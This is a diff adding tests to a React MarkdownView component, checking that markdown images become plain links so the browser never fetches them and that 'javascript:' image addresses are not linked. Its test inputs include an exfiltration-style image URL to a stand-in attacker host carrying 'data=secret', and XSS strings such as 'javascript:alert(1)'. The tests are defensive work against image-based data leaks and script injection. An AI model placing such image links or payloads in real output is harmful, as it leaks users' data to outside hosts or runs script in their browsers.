@@ -68,4 +68,39 @@ describe('MarkdownView', () => {
     expect(container.querySelector('script')).toBeNull()
     expect(container.textContent).toContain('<script>alert(1)</script>')
   })
+
+  it('renders an image as a link, so the browser does not fetch it', () => {
+    const { container } = render(
+      <MarkdownView
+        source={[
+          '![Chart](https://attacker.example/pixel.png?data=secret)',
+          '',
+          '![](https://attacker.example/blank.png)',
+          '',
+          '[![Badge](https://attacker.example/badge.png)](https://example.com)',
+        ].join('\n')}
+      />,
+    )
+
+    expect(container.querySelector('img')).toBeNull()
+    expect(screen.getByRole('link', { name: 'Image: Chart' }).getAttribute('href')).toBe(
+      'https://attacker.example/pixel.png?data=secret',
+    )
+    expect(screen.getByRole('link', { name: 'Image' }).getAttribute('href')).toBe(
+      'https://attacker.example/blank.png',
+    )
+    // An image inside a link stays one link, to the link's own address.
+    expect(screen.getByRole('link', { name: 'Image: Badge' }).getAttribute('href')).toBe(
+      'https://example.com',
+    )
+    expect(container.querySelector('a a')).toBeNull()
+  })
+
+  it('does not link an image whose address is not a safe URL', () => {
+    const { container } = render(<MarkdownView source={'![x](javascript:alert(1))'} />)
+
+    expect(container.querySelector('img')).toBeNull()
+    expect(container.querySelector('a')).toBeNull()
+    expect(container.textContent).toContain('Image: x')
+  })
 })
